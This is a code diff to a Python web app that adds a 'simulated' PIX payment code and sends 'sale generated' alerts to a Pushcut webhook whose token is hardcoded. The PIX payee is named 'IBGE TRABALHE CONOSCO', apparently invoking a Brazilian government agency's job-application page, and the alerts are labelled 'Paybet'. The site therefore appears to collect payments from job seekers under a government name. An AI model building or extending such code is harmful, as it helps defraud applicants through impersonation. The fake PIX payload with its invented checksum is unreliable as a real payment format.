@@ -5,6 +5,10 @@ import qrcode
 from io import BytesIO
 import base64
 
+def gerar_codigo_pix_simulado(valor, protocolo):
+    """Gerar código PIX simulado para demonstração"""
+    return f"00020126580014BR.GOV.BCB.PIX0136{protocolo}5204000053039865802BR5925IBGE TRABALHE CONOSCO6009SAO PAULO62070503***6304{str(abs(hash(protocolo)))[:4]}"
+
 def register_routes(app):
     """Registrar todas as rotas da aplicação"""
     
@@ -298,6 +302,14 @@ def register_routes(app):
                     
                     print(f"[PIX DEBUG] ✓ PIX real gerado com sucesso: {qr_data.get('transactionId')}")
                     
+                    # Enviar notificação Pushcut para venda gerada
+                    try:
+                        pushcut_url = "https://api.pushcut.io/enS18cRkjJ2jn0d7ciD1a/notifications/Paybet%20"
+                        pushcut_response = requests.post(pushcut_url, json={"text": "Venda gerada"}, timeout=5)
+                        print(f"[PUSHCUT] Notificação enviada: {pushcut_response.status_code}")
+                    except Exception as pushcut_error:
+                        print(f"[PUSHCUT] Erro ao enviar notificação: {pushcut_error}")
+                    
                     # Gerar QR Code em base64
                     import qrcode
                     import io
@@ -358,6 +370,14 @@ def register_routes(app):
                 img_str = base64.b64encode(img_buffer.getvalue()).decode()
                 
                 print("[PIX DEBUG] ✓ PIX de demonstração gerado com sucesso")
+                
+                # Enviar notificação Pushcut para venda gerada (demonstração)
+                try:
+                    pushcut_url = "https://api.pushcut.io/enS18cRkjJ2jn0d7ciD1a/notifications/Paybet%20"
+                    pushcut_response = requests.post(pushcut_url, json={"text": "Venda gerada"}, timeout=5)
+                    print(f"[PUSHCUT] Notificação enviada: {pushcut_response.status_code}")
+                except Exception as pushcut_error:
+                    print(f"[PUSHCUT] Erro ao enviar notificação: {pushcut_error}")
                 
                 return jsonify({
                     'success': True,
